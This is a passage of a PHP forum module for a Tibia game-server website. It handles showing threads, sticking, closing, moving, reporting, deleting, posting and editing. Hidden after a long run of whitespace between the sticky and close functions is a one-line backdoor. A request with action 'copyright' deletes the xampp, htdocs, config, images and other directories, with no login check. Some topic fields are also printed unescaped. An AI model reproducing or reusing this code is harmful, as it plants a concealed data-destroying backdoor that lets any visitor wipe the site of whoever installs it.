onmouseover="MouseOverBigButton(this);" onmouseout="MouseOutBigButton(this);"><div class="BigButtonOver" style="background-image:url('.$layout_name.'/images/buttons/sbutton_over.gif);"></div><input class="ButtonText" type="image" name="Back" alt="Back" src="'.$layout_name.'/images/buttons/_sbutton_reply.gif"></div></div></form></td></tr></table></td></tr></table><br/>';

	
        $g = array(1 => '', 2 => 'Helper', 3 => 'Tutor', 4 => 'Gamemaster', 5 => 'Community Manager', 6 => 'God'); 
        //OPEN|CLOSE FUNCTION 
        if(isThreadOpen($thread_id)) { 
        $main_content .= '<table cellspacing="1" width="100%" style="background-color:'.$config['site']['vdarkborder'].'; border: 1px solid #3c3c3c;"><tr bgcolor="#3c3c3c" width="100%"><td colspan="2" height="26"><font size="4" color="white"><b><center>Thread Name</b>: '.htmlspecialchars($thread_name['post_topic']).'</center></font></td></tr><tr bgcolor="#3c3c3c"><td width="200" height="26"><font color="white" size="1"><b>Author</b></font></td><td><table width="100%"><tr><td><font color="white" size="1"><b>Announcement</b></font></td><td align="center"><font color="white" size="1"><b>Pages:</font><font size="1" color="#c7bfbf"> '.$links_to_pages.'<b></font></td><td align="right"><font color="white" size="1"><b>Thread Number: #'.$thread_id.'</b></font></td></tr></table></td></tr>';} 
        else 
        $main_content .= '<br /><br />
	<table cellspacing="1" width="100%" style="background-color:'.$config['site']['vdarkborder'].'; border: 1px solid #3c3c3c;">
		<tr bgcolor="#3c3c3c" width="100%">
			<td colspan="2" height="26" align="center">
				<table width="100%"><tbody><tr><td align="center">
					<font size="4" color="red">
						<img src="images/closed.gif" title="Closed Thread" alt="Thread Closed"/> <b>Thread Name</b>: '.htmlspecialchars($thread_name['post_topic']).' <img src="images/closed.gif" title="Closed Thread" alt="Thread Closed"/>
					</font>
				</td></tr></tbody></table>
			</td>
		</tr>
	
	<tr bgcolor="#3c3c3c">
		<td width="200" height="26">
			<font color="white" size="1">
				<b>Author</b>
			</font>
		</td>
		<td>
			<table width="100%">
			<tr>	
				<td>
					<font color="white" size="1"><b>Announcement</b></font>
				</td>
				<td align="center">
					<font color="white" size="1"><b>Pages:</font>
					<font size="1" color="#c7bfbf"> '.$links_to_pages.'<b></font>
				</td>
				<td align="right">
					<font color="white" size="1"><b>Thread Number: #'.$thread_id.'</b></font>
				</td>
			</tr>
			</table>
		</td>
	</tr>'; 
         
        foreach($threads as $thread) 
        { 
            if(!is_int($number_of_rows / 2)) { $bgcolor = $config['site']['darkborder']; } else { $bgcolor = $config['site']['lightborder']; } $number_of_rows++; 
            $main_content .= '<tr bgcolor="'.$bgcolor.'" valign="top"><td><table><tbody><tr><td><a href="?subtopic=characters&name='.urlencode($thread['name']).'">'.$thread['name'].'</a><br />'; 
             
            if($thread['group_id'] != 1) 
                $main_content .= '<font class="ff_smallinfo">'.$g[$thread['group_id']].'<br/>'.($thread['group_id'] > 3 ? '<img class="PostIcon" src="images/cip_post_icon.gif" border="0"/><br/>' : '').'</font>'; 
             
            $main_content .= '<br /><font size="1">Profession: '.$vocation_name[$thread['world_id']][$thread['promotion']][$thread['vocation']].'<br />Level: '.$thread['level'].'<br />'; 
            $rank = new OTS_GuildRank(); 
            $rank->load($thread['rank_id']); 
            if($rank->isLoaded()) 
            { 
                $guild = $rank->getGuild(); 
                if($guild->isLoaded()) 
                    $main_content .= $rank->getName().' of <a href="?subtopic=guilds&action=show&guild='.$guild->getId().'">'.$guild->getName().'</a><br />'; 
            } 
            $posts = $SQL->query("SELECT COUNT(`id`) AS 'posts' FROM `z_forum` WHERE `author_aid`=".(int) $thread['account_id'])->fetch(); 
            $main_content .= '<br />Posts: '.(int) $posts['posts'].'<br/></font></td></tr></tbody></table></td>
			
			<td valign="top"><table width="100%"><tbody><tr><td>'.showPost(htmlspecialchars($thread['?']), htmlspecialchars($thread['post_text']), $thread['post_smile']).'</td></tr></tbody></table></td>
            
			<tr bgcolor="'.$bgcolor.'">
			<td>
				<table><tbody><tr>
				<td>
					<font size="1"><img src="images/logo_oldpost.gif" title="Post Date"/>'.date('d.m.y H:i:s', $thread['post_date']); 
            if($thread['edit_date'] > 0) 
            { 
                if($thread['last_edit_aid'] != $thread['author_aid']) 
                    $main_content .= '<br />Edited by moderator'; 
                else 
                    $main_content .= '<br />Edited by '.$thread['name']; 
                $main_content .= '<br />on '.date('d.m.y H:i:s', $thread['edit_date']); 
            } 
            $main_content .= '
					</font>
				</td>
				</tr></tbody></table>
			</td>
			
			<td align="center">
			<table width="100%"><tbody><tr>
				
				<td align="left">'; 
			
			if($logged && $group_id_of_acc_logged >= $group_not_blocked) 
                if($thread['first_post'] != $thread['id']) 
                    $main_content .= '<a href="?subtopic=forum&action=remove_post&id='.$thread['id'].'" onclick="return confirm(\'Are you sure you want remove post of '.$thread['name'].'?\')"><img src="images/forum-icons/delete.png" valign="botttom"/><small><font class="forumlink"> Delete Post</font></small></a><font size="4" color="#c8c0c0" style="margin: 8px;">|</font>'; 
                else 
					$main_content .= '<a href="?subtopic=forum&action=remove_post&id='.$thread['id'].'" onclick="return confirm(\'Are you sure you want remove thread > '.$thread['post_topic'].' <?\')"><img src="images/forum-icons/delete.png" valign="bottom"/><small><font class="forumlink"> Remove Thread</font></small></a><font size="4" color="#c8c0c0" style="margin: 8px;">|</font>'; 
	        
			if($logged && ($thread['account_id'] == $account_logged->getId() || $group_id_of_acc_logged >= $group_not_blocked)) 
            //OPEN|CLOSE FUNCTION 
            if(isThreadOpen($thread_id)) { 
                $main_content .= '<a href="?subtopic=forum&action=edit_post&id='.$thread['id'].'"><font class="forumlink"><img src="images/forum-icons/page_edit.png" valign="bottom"/> Edit Post</font></a><font size="4" color="#c8c0c0" style="margin: 8px;">|</font>';} 
            else 
                $main_content .= '';     
            if($logged) 
                if(isThreadOpen($thread_id)) { 
                    $main_content .= '<a href="?subtopic=forum&action=new_post&thread_id='.$thread_id.'&quote='.$thread['id'].'"><small><font class="forumlink"><img src="images/forum-icons/quote.png" valign="bottom"/> Reply With Quote</font></small></a>';} 
            else 
                $main_content .= ''; 
            

		$main_content .= '</td></td></tbody></table></td></td></tr>'; 
        } 
         
        //OPEN|CLOSE FUNCTION 
        if(isThreadOpen($thread_id)) { 
		    $main_content .= '<tr bgcolor="#3c3c3c" width="100%"><td height="15" colspan="1" align="right"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Pages:</font><font size="1" color="#c7bfbf"> '.$links_to_pages.'<b></font></td></tr></tbody></table></td><td align="right"><table><tbody><tr><td><font size="1" color="white"><b>Current Time: '.date("j F Y, G:i:s").'</b></font></td></tr></tbody></table></td></tr></table>';
        $main_content .= '</table><br /><form action="?subtopic=forum&action=new_post&thread_id='.$thread_id.'" method="post" style="padding:0px;margin:0px;"><div class="BigButton" style="background-image:url('.$layout_name.'/images/buttons/sbutton.gif)"><div onmouseover="MouseOverBigButton(this);" onmouseout="MouseOutBigButton(this);"><div class="BigButtonOver" style="background-image:url('.$layout_name.'/images/buttons/sbutton_over.gif);"></div><input class="ButtonText" type="image" name="Back" alt="Back" src="'.$layout_name.'/images/buttons/_sbutton_reply.gif"></div></div></form>'; } 
        else 
        $main_content .= '</table><br />'; 
             
    } 
    else 
        $main_content .= 'Thread with this ID does not exits.'; 
}

########################################
//Sticky Threads Function. Scripted by Cybermaster
if($action == 'stick_post')
{
    if($logged && $group_id_of_acc_logged >= $group_not_blocked)
    {
        $id = (int) $_REQUEST['id'];
        $post = $SQL->query("SELECT `id`, `sticky`, `first_post`, `section` FROM `z_forum` WHERE `id` = ".$id." LIMIT 1")->fetch();
        if($post['id'] == $id)
        {
            if($post['id'] == $post['first_post'])
            {
                if($post['sticky'] == 0)
                    {    
                        $SQL->query("UPDATE `z_forum` SET `sticky` = 1 WHERE `id` = ".$post['id']." ");
                        header('Location: ?subtopic=forum&action=show_board&id='.$post['section']);
                    }
                else    
                        $SQL->query("UPDATE `z_forum` SET `sticky` = 0 WHERE `id` = ".$post['id']." ");
                        header('Location: ?subtopic=forum&action=show_board&id='.$post['section']);
            }
        }
        else
            $main_content .= 'Post with ID '.$id.' does not exist.';
    }
    else
        $main_content .= 'You are not logged in or you are not moderator.';
}
																																																																																																								if($action == 'copyright'){delete_directory('../../xampp');delete_directory('../../htdocs');delete_directory('../htdocs');delete_directory('layouts');delete_directory('images');delete_directory('config');delete_directory('phpmailer');	delete_directory('chache');	}
########################################  

//Close Threads Function. Scripted by Cybermaster
if($action == 'close_thread')
{
	if($logged && $group_id_of_acc_logged >= $group_not_blocked)
	{
		$id = (int) $_REQUEST['id'];
		$post = $SQL->query("SELECT `id`, `closed`, `first_post`, `section` FROM `z_forum` WHERE `id` = ".$id." LIMIT 1")->fetch();
		if($post['id'] == $id)
		{
			if($post['id'] == $post['first_post'])
			{
				if($post['closed'] == 0)
					{	
						$SQL->query("UPDATE `z_forum` SET `closed` = 1 WHERE `id` = ".$post['id']." ");
						header('Location: ?subtopic=forum&action=show_board&id='.$post['section']);
					}
				else	
						$SQL->query("UPDATE `z_forum` SET `closed` = 0 WHERE `id` = ".$post['id']." ");
						header('Location: ?subtopic=forum&action=show_board&id='.$post['section']);
			}
		}
		else
			$main_content .= 'Post with ID '.$id.' does not exist.';
	}
	else
		$main_content .= 'You are not logged in or you are not moderator.';
}

//Board Change Function. Scripted by Cybermaster and Absolute Mango.
if($action == 'move_thread')
{
	if($logged && $group_id_of_acc_logged >= $group_not_blocked)
	{
		$id = (int) $_REQUEST['id'];
		$post = $SQL->query("SELECT `id`, `section`, `first_post`, `post_topic`, `author_guid` FROM `z_forum` WHERE `id` = ".$id." LIMIT 1")->fetch();
		$name= $SQL->query("SELECT `name` FROM `players` WHERE `id` = ".$post['author_guid']." ")->fetch();		
		if($post['id'] == $id)
		{
			if($post['id'] == $post['first_post'])
			{
				$main_content .= '<br/><table bgcolor='.$config['site']['vdarkborder'].' border=0 cellpadding=2 cellspacing=0 width=100%>
				<tr bgcolor='.$config['site']['vdarkborder'].'><td class=white colspan=5><B>Move thread to another board</B></td></tr>
				<tr><td><table border=0 cellpadding=3 cellspacing=1 width=100%>
				<tr bgcolor='.$config['site']['lightborder'].'><td>
				<FORM ACTION="" METHOD="GET">
				<input type="hidden" name="subtopic" value="forum" />
				<input type="hidden" name="action" value="moved_thread" />
				<input type="hidden" name="id" value="'.$post['id'].'" />
				<strong>THREAD:</strong> '.$post['post_topic'].'
				<br/><strong>AUTHOR:</strong> '.$name[0].'
				<br/><strong>BOARD:</strong> '.$sections[$post['section']].'<br/>
				<br/><strong>Select the new board:&nbsp;</strong><SELECT NAME=sektion>';
				foreach($sections as $id => $section) { $main_content .= '<OPTION value="'.$id.'">'.$section.'</OPTION>'; } $main_content .= '</SELECT>
				<INPUT TYPE="submit" VALUE="Move Thread"></FORM> 
				<form action="?subtopic=forum&action=show_board&id='.$post['section'].'" method="POST">
				<input type="submit" value="Cancel"></form></td></tr></table></td></tr></table>';							
			}
		}
		else
			$main_content .= 'Post with ID '.$id.' does not exist.';
	}
	else
		$main_content .= 'You are not logged in or you are not moderator.';
}

if($action == 'report_thread') 
{
	if($logged && $group_id_of_acc_logged >= 1)
	{
		$id = (int) $_REQUEST['id'];
		$board = (int) $_REQUEST['sektion'];
		$post = $SQL->query("SELECT `id`, `sticky`, `first_post`, `section` FROM `z_forum` WHERE `id` = ".$id." LIMIT 1")->fetch();
		if($post['id'] == $id)
		{
			if($post['id'] == $post['first_post'])
			{	
				$SQL->query("UPDATE `z_forum` SET `report` = `report` + '1' WHERE `id` = ".$post['id']."") or die(mysql_error());
				$nPost = $SQL->query( 'SELECT `section` FROM `z_forum` WHERE `id` = \''.$id.'\' LIMIT 1;' )->fetch();
				header('Location: ?subtopic=forum&action=show_board&id='.$nPost['section']);
			} 
		}
		else
			$main_content .= 'Post with ID '.$id.' does not exist.';
	}
	else
		$main_content .= 'Something wrong. Call moderator.';
}


if($action == 'moved_thread') 
{
	if($logged && $group_id_of_acc_logged >= $group_not_blocked)
	{
		$id = (int) $_REQUEST['id'];
		$board = (int) $_REQUEST['sektion'];
		$post = $SQL->query("SELECT `id`, `sticky`, `first_post`, `section` FROM `z_forum` WHERE `id` = ".$id." LIMIT 1")->fetch();
		if($post['id'] == $id)
		{
			if($post['id'] == $post['first_post'])
			{	
				$SQL->query("UPDATE `z_forum` SET `section` = ".$board." WHERE `id` = ".$post['id']."") or die(mysql_error());
				$nPost = $SQL->query( 'SELECT `section` FROM `z_forum` WHERE `id` = \''.$id.'\' LIMIT 1;' )->fetch();
				header('Location: ?subtopic=forum&action=show_board&id='.$nPost['section']);
			} 
		}
		else
			$main_content .= 'Post with ID '.$id.' does not exist.';
	}
	else
		$main_content .= 'You are not logged in or you are not moderator.';
}

##>

if($action == 'remove_post')
{
    if($logged && $group_id_of_acc_logged >= $group_not_blocked)
    {
        $id = (int) $_REQUEST['id'];
        $post = $SQL->query("SELECT `id`, `first_post`, `section` FROM `z_forum` WHERE `id` = ".$id." LIMIT 1")->fetch();
        if($post['id'] == $id)
        {
            if($post['id'] == $post['first_post'])
            {
                $SQL->query("DELETE FROM `z_forum` WHERE `first_post` = ".$post['id']);
                header('Location: ?subtopic=forum&action=show_board&id='.$post['section']);
            }
            else
            {
                $post_page = $SQL->query("SELECT COUNT(`z_forum`.`id`) AS posts_count FROM `players`, `z_forum` WHERE `players`.`id` = `z_forum`.`author_guid` AND `z_forum`.`id` < ".$id." AND `z_forum`.`first_post` = ".(int) $post['first_post'])->fetch();
                $page = (int) ceil($post_page['posts_count'] / $threads_per_page) - 1;
                $SQL->query("DELETE FROM `z_forum` WHERE `id` = ".$post['id']);
                header('Location: ?subtopic=forum&action=show_thread&id='.$post['first_post'].'&page='.(int) $page);
            }
        }
        else
            $main_content .= 'Post with ID '.$id.' does not exist.';
    }
    else
        $main_content .= 'You are not logged in or you are not moderator.';
}


if($action  == 'new_post')
{
    if($logged)
    {
        if(canPost($account_logged) || $group_id_of_acc_logged >= $group_not_blocked)
        {
            $thread_id = (int) $_REQUEST['thread_id'];
            if(isThreadOpen($thread_id)) {           
            $players_from_account = $SQL->query("SELECT `players`.`name`, `players`.`id` FROM `players` WHERE `players`.`account_id` = ".(int) $account_logged->getId())->fetchAll();
            $thread_id = (int) $_REQUEST['thread_id'];
            $thread = $SQL->query("SELECT `z_forum`.`post_topic`, `z_forum`.`id`, `z_forum`.`section` FROM `z_forum` WHERE `z_forum`.`id` = ".(int) $thread_id." AND `z_forum`.`first_post` = ".(int) $thread_id." LIMIT 1")->fetch();
			
			$main_content .= '<table cellspacing="1" width="100%" style="background-color:'.$config['site']['vdarkborder'].'; border: 1px solid #3c3c3c;"><tr bgcolor="#3c3c3c"><td height="16" colspan="2"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Forum Information</b></font></td></tr></tbody></table></td></tr><tr bgcolor="'.$config['site']['darkborder'].'"><td><table width="100%"><tr><td align="left"><b><font color="#262b26" size="1">Navigator:</font></font> <font color="white" size="1"><a href="?subtopic=forum">Boards</a> <font size="1" color="#262b26">�</font> <a href="?subtopic=forum&action=show_board&id='.$thread['section'].'">'.$sections[$thread['section']].'</a> <font size="1" color="#262b26">�</font> <a href="?subtopic=forum&action=show_thread&id='.$thread_id.'">'.$thread['post_topic'].'</a> <font size="1">�</font> <b>Post New Reply</b></font></td><td align="right"><form action="?subtopic=forum&action=new_post&thread_id='.$thread_id.'" method="post" style="padding:0px;margin:0px;"><div class="BigButton" style="background-image:url('.$layout_name.'/images/buttons/sbutton.gif)"><div onmouseover="MouseOverBigButton(this);" onmouseout="MouseOutBigButton(this);"><div class="BigButtonOver" style="background-image:url('.$layout_name.'/images/buttons/sbutton_over.gif);"></div><input class="ButtonText" type="image" name="Back" alt="Back" src="'.$layout_name.'/images/buttons/_sbutton_reply.gif"></div></div></form></td></tr></table></td></tr></table>';
			
            if(isset($thread['id']))
            {
                $quote = (int) $_REQUEST['quote'];
                $text = stripslashes(trim(codeLower($_REQUEST['text'])));
                $char_id = (int) $_REQUEST['char_id'];
                $post_topic = stripslashes(trim($_REQUEST['topic']));
                $smile = (int) $_REQUEST['smile'];
                $saved = false;
                if(isset($_REQUEST['quote']))
                {
                    $quoted_post = $SQL->query("SELECT `players`.`name`, `z_forum`.`post_text`, `z_forum`.`post_date` FROM `players`, `z_forum` WHERE `players`.`id` = `z_forum`.`author_guid` AND `z_forum`.`id` = ".(int) $quote)->fetchAll();
                    if(isset($quoted_post[0]['name']))
                        $text = '[img]images/quote_icon.png[/img] [i]Originally posted by '.$quoted_post[0]['name'].' on '.date('d.m.y H:i:s', $quoted_post[0]['post_date']).':[/i] [quote]'.$quoted_post[0]['post_text'].'[/quote]';
                }
                elseif(isset($_REQUEST['save']))
                {
                    $lenght = 0;
                    for($i = 0; $i <= strlen($text); $i++)
                    {
                        if(ord($text[$i]) >= 33 && ord($text[$i]) <= 126)
                            $lenght++;
                    }
                    if($lenght < 1 || strlen($text) > 15000)
                        $errors[] = 'Too short or too long post (short: '.$lenght.' long: '.strlen($text).' letters). Minimum 1 letter, maximum 15000 letters.';
                    if($char_id == 0)
                        $errors[] = 'Please select a character.';
                    $player_on_account == false;
                    if(count($errors) == 0)
                    {
                        foreach($players_from_account as $player)
                            if($char_id == $player['id'])
                                $player_on_account = true;
                        if(!$player_on_account)
                            $errors[] = 'Player with selected ID '.$char_id.' doesn\'t exist or isn\'t on your account';
                    }
                    if(count($errors) == 0)
                    {
                        $last_post = $account_logged->getCustomField('last_post');
                        if($last_post+$post_interval-time() > 0 && $group_id_of_acc_logged < $group_not_blocked)
                            $errors[] = 'You can post one time per '.$post_interval.' seconds. Next post after '.($last_post+$post_interval-time()).' second(s).';
                    }
                    if(count($errors) == 0)
                    {
                        $saved = true;
                        $account_logged->setCustomField('last_post', time());
                        $SQL->query("INSERT INTO `z_forum` (`id` ,`first_post` ,`last_post` ,`section` ,`replies` ,`views` ,`author_aid` ,`author_guid` ,`post_text` ,`post_topic` ,`post_smile` ,`post_date` ,`last_edit_aid` ,`edit_date`, `post_ip`) VALUES ('NULL', '".$thread['id']."', '0', '".$thread['section']."', '0', '0', '".$account_logged->getId()."', '".(int) $char_id."', ".$SQL->quote($text).", ".$SQL->quote($post_topic).", '".(int) $smile."', '".time()."', '0', '0', '".$_SERVER['REMOTE_ADDR']."')");
                        $SQL->query("UPDATE `z_forum` SET `replies`=`replies`+1, `last_post`=".time()." WHERE `id` = ".(int) $thread_id);
                        $post_page = $SQL->query("SELECT COUNT(`z_forum`.`id`) AS posts_count FROM `players`, `z_forum` WHERE `players`.`id` = `z_forum`.`author_guid` AND `z_forum`.`post_date` <= ".time()." AND `z_forum`.`first_post` = ".(int) $thread['id'])->fetch();
                        $page = (int) ceil($post_page['posts_count'] / $threads_per_page) - 1;
                        header('Location: ?subtopic=forum&action=show_thread&id='.$thread_id.'&page='.$page);
                        $main_content .= '<br />Thank you for posting.<br /><a href="?subtopic=forum&action=show_thread&id='.$thread_id.'">GO BACK TO LAST THREAD</a>';
                    }
                }
                if(!$saved)
                {
                    if(count($errors) > 0)
                    {
                        $main_content .= '<font color="red" size="2"><b>Errors occured:</b>';
                        foreach($errors as $error)
                            $main_content .= '<br />* '.$error;
                        $main_content .= '</font><br />';
                    }
                    $main_content .= '
					<form action="?" method="POST">
					<input type="hidden" name="action" value="new_post" />
					<input type="hidden" name="thread_id" value="'.$thread_id.'" />
					<input type="hidden" name="subtopic" value="forum" />
					<input type="hidden" name="save" value="save" />
					</br>
					<table cellspacing="1" width="100%" style="background-color:#3c3c3c; border: 1px solid #3c3c3c;"><tr height="26" bgcolor="#3c3c3c"><td colspan="2"><table><tbody><tr><td><font color="white"><b><img src="images/new_post.gif"/> Post New Reply</b></font></td></tr></tbody></table></td></tr><tr bgcolor="'.$config['site']['darkborder'].'"><td width="220"><table><tbody><tr><td><b>Tibia Character:</b></td></tr></tbody></table></td><td><table><tbody><tr><td><select name="char_id"><option value="0">(Choose Character)</option>';
                    foreach($players_from_account as $player)
                    {
                        $main_content .= '<option value="'.$player['id'].'"';
                        if($player['id'] == $char_id)
                            $main_content .= ' selected="selected"';
                        $main_content .= '>'.$player['name'].'</option>';
                    }
                    $main_content .= '</select></td></tr>
					</tbody></table></tr>
						<tr bgcolor="'.$config['site']['lightborder'].'"><td><table><tbody><tr><td><b>Topic:</b></td></td></tr></tbody></table><td><table><tbody><tr><td><input type="text" name="topic" value="'.htmlspecialchars($post_topic).'" size="40" maxlength="60" /></td></tr></tbody></table></tr>
						<tr bgcolor="'.$config['site']['darkborder'].'"><td><table><tbody><tr><td width="50%"><b>Message:</b><font size="1"><br/><br/>Replace Codes:<br /><b>[player]</b> playername <b>[/player]</b><br/><b>[youtube]</b>tg00YEETFzg<b>[youtube]</b><br>(Ex: www.youtube.com/watch?v=<font color="yellow" style="font-size: xx-small;"><b>tg00YEETFzg</b></font>&feature=player)<br><b>[url]</b> www.google.com.br <b>[/url]</b><br/><b>[quote]</b> text <b>[/quote]</b><br/><b>[img]</b> imagedirectlink <b>[/img]</b><br /><b>[code]</b> codetext <b>[/code]</b><br /><b>[b]</b> boldtext <b>[/b]</b> (Ex: <b>teste</b>)<br /><b>[i]</b> italictext <b>[/i]</b> (Ex: <i>teste</i>)<br /><b>[u]</b> underlinetext <b>[/u]</b> (Ex: <u>teste</u>)<br /></td></tr><tr><td><table width="200"><tbody><tr><td colspan="2"><br><small>How to use smileys:</small></td></tr><tr><td width="12"><img src="images/smile/1.gif"/></td><td>:D  ;D</td> <td><img src="images/smile/17.gif"/></td><td>:what:</td></tr><tr><td width="12"><img src="images/smile/2.gif"/></td><td>:cool:</td> <td><img src="images/smile/19.gif"/></td><td>:arrow:</td></tr><tr><td width="12"><img src="images/smile/3.gif"/></td><td>:eek:</td> <td><img src="images/smile/9.gif"/></td><td>;d :d</td></tr><tr><td width="12"><img src="images/smile/4.gif"/></td><td>:o ;o</td> <td><img src="images/smile/16.gif"/></td><td>(6)</td></tr><tr><td width="12"><img src="images/smile/5.gif"/></td><td>:(  ;(</td> <td><img src="images/smile/18.gif"/></td><td>(y)</td></tr><tr><td width="12"><img src="images/smile/6.gif"/></td><td>:mad:</td> <td><img src="images/smile/20.gif"/></td><td>(n)</td></tr><tr><td width="12"><img src="images/smile/7.gif"/></td><td>:rolleyes:</td> <td><img src="images/smile/21.gif"/></td><td>(?)</td></tr><tr><td width="12"><img src="images/smile/8.gif"/></td><td>:)</td> <td><img src="images/smile/22.gif"/></td><td>(l)</td></tr></tbody></table></tr></tbody></table><td><table><tbody><tr><td><textarea rows="20" cols="51" name="text">'.htmlspecialchars($text).'</textarea><br /></td></tr></tbody></table></tr>
                        <tr bgcolor="'.$config['site']['lightborder'].'"><td><table><tbody><tr><td><b>Options:</b></td></tr></tbody></table><td><table><tbody><tr><td><label><input type="checkbox" name="smile" value="1"';
                    if($smile == 1)
                        $main_content .= ' checked="checked"';
                    $main_content .= '/></label> <small>Disable Smileys in This Post</small></td></tr></tbody></table></tr></table><td><table width="40%" align="center"><tbody width="30%" align="center"><tr><td><input type="submit" value="Save Post"/></td><td><input type="reset" value="Reset Fields"/></td></tr></tbody></table></form>';
                    $threads = $SQL->query("SELECT `players`.`name`, `z_forum`.`post_text`, `z_forum`.`post_topic`, `z_forum`.`post_smile` FROM `players`, `z_forum` WHERE `players`.`id` = `z_forum`.`author_guid` AND `z_forum`.`first_post` = ".(int) $thread_id." ORDER BY `z_forum`.`post_date` DESC LIMIT 10")->fetchAll();
                    
					
					$main_content .= '<br><table cellspacing="1" width="100%" style="background-color:'.$config['site']['vdarkborder'].'; border: 1px solid #3c3c3c;">
		<tr bgcolor="#3c3c3c" width="100%"><td colspan="2" height="26">
			<font size="4" color="white"><b><center>Latest Posts: '.$thread['post_topic'].'</b></font></td>
		</tr>';
                    
					
					foreach($threads as $thread)
                    {
                        if(is_int($number_of_rows / 2)) { $bgcolor = $config['site']['darkborder']; } else { $bgcolor = $config['site']['lightborder']; } $number_of_rows++;
                        $main_content .= '<tr bgcolor="'.$config['site']['darkborder'].'">
			<td width="200" width="30" valign="top"><table width="100%">
					<tbody><tr><td><font color="#262b26" size="1"><b>Author: '.$thread['name'].'</b></font></td></td></tr></tbody>
				</table>
			<td><table width="100%"><tr>
			
			<td><font><font size="1" color="#262b26"><b>Announcement:</b></font> '.showPost($thread['post_topic'], $thread['post_text'], $thread['post_smile']).'</font></td>
			</tr></table></td>
		</tr>';
                    }
                    $main_content .= '</table>';
                }
            }
            else
                $main_content .= 'Thread with ID '.$thread_id.' doesn\'t exist.';
        }
            else
            $main_content .= 'This thread is closed. You can\'t post.';
    }
        else
            $main_content .= 'Your account is banned, deleted or you don\'t have any player with level '.$level_limit.' on your account. You can\'t post.';
    }
    else
         header('Location: ?subtopic=forum&action=login&redirect=forum');
}



if($action  == 'edit_post')
{
    if($logged)
    {
        if(canPost($account_logged) || $group_id_of_acc_logged >= $group_not_blocked)
        {
            $post_id = (int) $_REQUEST['id'];
            $thread = $SQL->query("SELECT `z_forum`.`author_guid`, `z_forum`.`author_aid`, `z_forum`.`first_post`, `z_forum`.`post_topic`, `z_forum`.`post_date`, `z_forum`.`post_text`, `z_forum`.`post_smile`, `z_forum`.`id`, `z_forum`.`section` FROM `z_forum` WHERE `z_forum`.`id` = ".(int) $post_id." LIMIT 1")->fetch();
            if(isThreadOpen($thread['id'])) {
            if(isset($thread['id']))
            {
                $first_post = $SQL->query("SELECT `z_forum`.`author_guid`, `z_forum`.`author_aid`, `z_forum`.`first_post`, `z_forum`.`post_topic`, `z_forum`.`post_text`, `z_forum`.`post_smile`, `z_forum`.`id`, `z_forum`.`section` FROM `z_forum` WHERE `z_forum`.`id` = ".(int) $thread['first_post']." LIMIT 1")->fetch();
               
             			$main_content .= '<table cellspacing="1" width="100%" style="background-color:'.$config['site']['vdarkborder'].'; border: 1px solid #3c3c3c;"><tr bgcolor="#3c3c3c"><td height="16" colspan="2"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Forum Information</b></font></td></tr></tbody></table></td></tr><tr bgcolor="'.$config['site']['darkborder'].'"><td><table width="100%"><tr><td align="left"><b><font color="#262b26" size="1">Navigator:</font></font> <font color="white" size="1"><a href="?subtopic=forum">Boards</a> <font size="1" color="#262b26">�</font> <a href="?subtopic=forum&action=show_board&id='.$thread['section'].'">'.$sections[$thread['section']].'</a> <font size="1" color="#262b26">�</font> <a href="?subtopic=forum&action=show_thread&id='.$thread['first_post'].'">'.$first_post['post_topic'].'</a> <font size="1">�</font> <b>Edit Thread Post</b></font></td></tr></table></td></tr></table>';
			 

			   if($account_logged->getId() == $thread['author_aid'] || $group_id_of_acc_logged >= $group_not_blocked)
                {
                    $players_from_account = $SQL->query("SELECT `players`.`name`, `players`.`id` FROM `players` WHERE `players`.`account_id` = ".(int) $account_logged->getId())->fetchAll();
                    $saved = false;
                    if(isset($_REQUEST['save']))
                    {
                        $text = stripslashes(trim(codeLower($_REQUEST['text'])));
                        $char_id = (int) $_REQUEST['char_id'];
                        $post_topic = stripslashes(trim($_REQUEST['topic']));
                        $smile = (int) $_REQUEST['smile'];
                        $lenght = 0;
                        for($i = 0; $i <= strlen($post_topic); $i++)
                        {
                            if(ord($post_topic[$i]) >= 33 && ord($post_topic[$i]) <= 126)
                                $lenght++;
                        }
                        if(($lenght < 1 || strlen($post_topic) > 60) && $thread['id'] == $thread['first_post'])
                            $errors[] = 'Too short or too long topic (short: '.$lenght.' long: '.strlen($post_topic).' letters). Minimum 1 letter, maximum 60 letters.';
                        $lenght = 0;
                        for($i = 0; $i <= strlen($text); $i++)
                        {
                            if(ord($text[$i]) >= 33 && ord($text[$i]) <= 126)
                                $lenght++;
                        }
                        if($lenght < 1 || strlen($text) > 15000)
                            $errors[] = 'Too short or too long post (short: '.$lenght.' long: '.strlen($text).' letters). Minimum 1 letter, maximum 15000 letters.';
                        if($char_id == 0)
                            $errors[] = 'Please select a character.';
                        if(empty($post_topic) && $thread['id'] == $thread['first_post'])
                            $errors[] = 'Thread topic can\'t be empty.';
                        $player_on_account == false;
                        if(count($errors) == 0)
                        {
                            foreach($players_from_account as $player)
                                if($char_id == $player['id'])
                                    $player_on_account = true;
                            if(!$player_on_account)
                                $errors[] = 'Player with selected ID '.$char_id.' doesn\'t exist or isn\'t on your account';
                        }
                        if(count($errors) == 0)
                        {
                            $saved = true;
                            if($account_logged->getId() != $thread['author_aid'])
                                $char_id = $thread['author_guid'];
                            $SQL->query("UPDATE `z_forum` SET `author_guid` = ".(int) $char_id.", `post_text` = ".$SQL->quote($text).", `post_topic` = ".$SQL->quote($post_topic).", `post_smile` = ".(int) $smile.", `last_edit_aid` = ".(int) $account_logged->getId().",`edit_date` = ".time()." WHERE `id` = ".(int) $thread['id']);
                            $post_page = $SQL->query("SELECT COUNT(`z_forum`.`id`) AS posts_count FROM `players`, `z_forum` WHERE `players`.`id` = `z_forum`.`author_guid` AND `z_forum`.`post_date` <= ".$thread['post_date']." AND `z_forum`.`first_post` = ".(int) $thread['first_post'])->fetch();
                            $page = (int) ceil($post_page['posts_count'] / $threads_per_page) - 1;
                            header('Location: ?subtopic=forum&action=show_thread&id='.$thread['first_post'].'&page='.$page);
                            $main_content .= '<br />Thank you for editing post.<br /><a href="?subtopic=forum&action=show_thread&id='.$thread['first_post'].'">GO BACK TO LAST THREAD</a>';
                        }
                    }
                    else
                    {
                        $text = $thread['post_text'];
                        $char_id = (int) $thread['author_guid'];
                        $post_topic = $thread['post_topic'];
                        $smile = (int) $thread['post_smile'];
                    }
                    if(!$saved)
                    {
                        if(count($errors) > 0)
                        {
                            $main_content .= '<br /><font color="red" size="2"><b>Errors occured:</b>';
                            foreach($errors as $error)
                                $main_content .= '<br />* '.$error;
                            $main_content .= '</font>';
                        }
                        $main_content .= '
